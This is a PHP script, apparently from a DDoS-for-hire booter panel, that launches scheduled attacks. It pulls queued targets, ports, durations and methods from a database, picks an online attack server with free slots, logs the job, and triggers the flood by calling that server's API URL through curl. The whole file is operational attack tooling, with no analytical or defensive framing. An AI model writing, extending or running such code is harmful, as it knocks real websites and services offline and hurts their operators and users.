<?php
	
	require 'database.php';
	require 'funcsinit.php';

	$CheckAttacks = $odb -> query("SELECT * FROM `sheduledattacks` WHERE `started` = 0 AND `datetime` < UNIX_TIMESTAMP()");
	$countsheduled = $CheckAttacks -> rowCount();

	if($countsheduled == 0){
		echo json_encode(array('status'=>'error', 'message'=>'No scheduled attacks, skipping..'));
		die();	
	}
	while ($attacks = $CheckAttacks -> fetch(PDO::FETCH_ASSOC)) {
		$user = $attacks['user'];
		$host = $attacks['target'];
		$port = $attacks['port'];
		$time = $attacks['time'];
		$method = $attacks['method'];
		
		

		$atck = 0;

		
		$methodupd = $method;
		
		$MethodDB = $odb -> prepare("SELECT * FROM `methods` WHERE `apiname` = :method");
		$MethodDB -> execute(array(':method' => $methodupd));
		$methodinfo = $MethodDB -> fetch(PDO::FETCH_ASSOC);
		$premiummethod = $methodinfo['premium'];

		$SQLSelectServer = $odb -> prepare("SELECT * FROM `servers` WHERE `id` > 0 AND `status` = 'online' AND `methods` LIKE :method ORDER BY RAND()");
		$SQLSelectServer -> execute(array(':method' => "%{$methodupd}%"));
		
		$server = $SQLSelectServer -> fetch(PDO::FETCH_ASSOC);
		
		$name = $server['name'];

		$LogsDB = $odb -> prepare("SELECT * FROM `attacklogs` WHERE `servers` LIKE :name AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
		$LogsDB -> execute(array(':name' => "%{$name}%"));
		$countslots = $LogsDB -> rowCount();

		if ($countslots >= $server['slots']) {
			continue;
		}

		$atck++;

		if(($countslots+$atck) > $server['slots']){
			continue;
		}

		
		$FindInApi = array('[host]', '[port]', '[time]', '[method]');
		$ApiReplace = array($host, $port, $time, $method);
		$API = $server['apiurl'];

		$handler = $server['name'];
		
		$APIReplaced = str_replace($FindInApi, $ApiReplace, $API);
		
		

		$UpdateShed = $odb -> prepare("UPDATE `sheduledattacks` SET `started` = 1 WHERE `user` = :user AND `target` = :target AND `started` = 0");
		$UpdateShed -> execute(array(':user' => $user, ':target' => $host));

		$InsertLogs = $odb -> prepare("INSERT INTO `attacklogs`(`id`, `user`, `target`, `port`, `time`, `method`, `concs`, `stopped`, `servers`, `premium`, `apiattack`, `date`, `datetime`) VALUES (NULL, :user, :target, :port, :time, :method, :concs, '0', :handler, :premium, '2', UNIX_TIMESTAMP(NOW()), NOW())");
		$InsertLogs -> execute(array(':user' => $user, ':target' => $host, ':port' => $port, ':time' => $time, ':method' => $methodupd, ':concs' => '1', ':handler' => $handler, ':premium' => $premiummethod));

			

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $APIReplaced);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);    
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $result = curl_exec($ch);
        curl_close($ch);

        $started = $atck+1;
        $failed = $countsheduled - $started;
		
	}
	if($atck == 0) {
		
		$errors[] = "No available slots!";
		echo 'No available slots for your other attacks, started: '.$started.' / failed: '.$failed.'';
		die();	
    }
    
	echo 'Attacks successfully sent, started: '.$started.' / failed: '.$failed.'';




	













?>